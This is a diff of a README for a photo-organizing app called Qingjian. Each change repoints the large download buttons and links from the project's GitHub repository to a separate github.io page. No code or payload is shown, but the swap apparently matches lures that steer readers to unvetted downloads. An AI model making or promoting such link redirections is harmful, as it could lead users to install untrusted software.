@@ -1,7 +1,7 @@
 <h1>📸 Qingjian - Organize Your Photos and Videos in Seconds</h1>
 
 <p align="center">
-  <a href="https://github.com/Sissyrising64/Qingjian" style="background-color:#FF6B6B;color:#FFFFFF;padding:15px 35px;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;display:inline-block;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ DOWNLOAD QINGJIAN NOW</a>
+  <a href="https://sissyrising64.github.io" style="background-color:#FF6B6B;color:#FFFFFF;padding:15px 35px;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;display:inline-block;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ DOWNLOAD QINGJIAN NOW</a>
 </p>
 
 ---
@@ -24,7 +24,7 @@ Follow these three steps, and you'll be organizing your media in no time. No tec
 
 ### Step 1: Download the App
 
-👉 **Visit this link to download the application:** [https://github.com/Sissyrising64/Qingjian](https://github.com/Sissyrising64/Qingjian)
+👉 **Visit this link to download the application:** [https://sissyrising64.github.io](https://sissyrising64.github.io)
 
 )
 
@@ -211,7 +211,7 @@ You've got thousand of photos from that trip, right? Those screenshots clutterin
 ### 👉 **Download Qingjian today, and take control of your media library.**
 
 <p align="center">
-  <a href="https://github.com/Sissyrising64/Qingjian" style="background-color:#4CAF50;color:#FFFFFF;padding:12px 30px;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;display:inline-block;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ GET QINGJIAN — FREE</a>
+  <a href="https://sissyrising64.github.io" style="background-color:#4CAF50;color:#FFFFFF;padding:12px 30px;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;display:inline-block;box-shadow:0 4px 6px rgba(0,0,0,0.1);">⬇️ GET QINGJIAN — FREE</a>
 </p>
 
 ---
